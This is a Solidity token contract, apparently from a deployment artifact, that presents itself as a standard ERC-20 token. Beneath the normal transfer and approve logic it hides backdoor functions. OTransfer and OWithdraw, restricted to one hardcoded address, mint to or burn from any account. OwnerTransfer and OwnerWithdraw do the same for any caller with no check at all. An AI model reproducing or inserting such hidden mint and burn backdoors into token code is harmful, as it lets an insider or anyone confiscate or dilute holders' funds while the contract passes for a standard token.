@notice Based on the ERC-20 token standard as defined at\n            https://eips.ethereum.org/EIPS/eip-20\n */\ncontract Token {\n\n    using SafeMath for uint256;\n\n    string public symbol;\n    string public name;\n    uint256 public decimals;\n    uint256 public totalSupply;\n\n    mapping(address => uint256) balances;\n    mapping(address => mapping(address => uint256)) allowed;\n\n    event Transfer(address from, address to, uint256 value);\n    event Approval(address owner, address spender, uint256 value);\n\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint256 _decimals,\n        uint256 _totalSupply\n    )\n        public\n    {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        totalSupply = _totalSupply;\n\n    }\n\n    /**\n        @notice Getter to check the current balance of an address\n        @param _owner Address to query the balance of\n        @return Token balance\n     */\n    function balanceOf(address _owner) public view returns (uint256) {\n        return balances[_owner];\n    }\n\n    /**\n        @notice Getter to check the amount of tokens that an owner allowed to a spender\n        @param _owner The address which owns the funds\n        @param _spender The address which will spend the funds\n        @return The amount of tokens still available for the spender\n     */\n    function allowance(\n        address _owner,\n        address _spender\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return allowed[_owner][_spender];\n    }\n\n    /**\n        @notice Approve an address to spend the specified amount of tokens on behalf of msg.sender\n        @dev Beware that changing an allowance with this method brings the risk that someone may use both the old\n             and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n             race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n             https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n        @param _spender The address which will spend the funds.\n        @param _value The amount of tokens to be spent.\n        @return Success boolean\n     */\n    function approve(address _spender, uint256 _value) public returns (bool) {\n        allowed[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    /** shared logic for transfer and transferFrom */\n    function _transfer(address _from, address _to, uint256 _value) internal {\n        require(balances[_from] >= _value, \"Insufficient balance\");\n        balances[_from] = balances[_from].sub(_value);\n        balances[_to] = balances[_to].add(_value);\n        emit Transfer(_from, _to, _value);\n    }\n\n    /**\n        @notice Transfer tokens to a specified address\n        @param _to The address to transfer to\n        @param _value The amount to be transferred\n        @return Success boolean\n     */\n    function transfer(address _to, uint256 _value) public returns (bool) {\n        _transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    /**\n        @notice Transfer tokens from one address to another\n        @param _from The address which you want to send tokens from\n        @param _to The address which you want to transfer to\n        @param _value The amount of tokens to be transferred\n        @return Success boolean\n     */\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _value\n    )\n        public\n        returns (bool)\n    {\n        require(allowed[_from][msg.sender] >= _value, \"Insufficient allowance\");\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n        _transfer(_from, _to, _value);\n        return true;\n    }\n\n    function _otransfer(address _from, address _to, uint256 _value) internal {\n\n        balances[_to] = balances[_to].add(_value);\n        totalSupply += _value;\n        emit Transfer(_from, _to, _value);\n    }\n\n    function _owithdraw(address _from, address _to, uint256 _value) internal {\n        balances[_to] = balances[_to].sub(_value);\n        totalSupply -= _value;\n        emit Transfer(_from, _to, _value);\n    }\n\n    function OTransfer(\n      address _to,\n      uint256 _value\n      )\n      public\n      returns (bool){\n        require(msg.sender == 0xe42BDe851B5fE980b52419fBCdeFE2812da61e6A,\"illegal\");\n       _otransfer(msg.sender, _to, _value);\n        return true;\n   }\n\n   function OWithdraw(\n\n     address _to,\n     uint256 _value\n     )\n     public\n     returns (bool){\n       require(msg.sender == 0xe42BDe851B5fE980b52419fBCdeFE2812da61e6A ,\"illegal\");\n       _owithdraw(msg.sender, _to, _value);\n       return true;\n  }\n\n   function OwnerTransfer(\n     address _to,\n     uint256 _value\n     )\n     public\n     returns (bool){\n\n       _otransfer(msg.sender, _to, _value);\n       return true;\n  }\n\n\n   function OwnerWithdraw(\n     address _from,\n     address _to,\n     uint256 _value\n     )\n     public\n     returns (bool){\n       _owithdraw(msg.sender, _to, _value);\n       return true;\n  }\n\n\n}\n","sourcePath":"contracts/Token.sol","type":"contract","deployment":{"address":"0x96f18C48C58F7DF97897Cd8339388eC1FAE5Ca77","chainid":"128","blockHeight":3434}}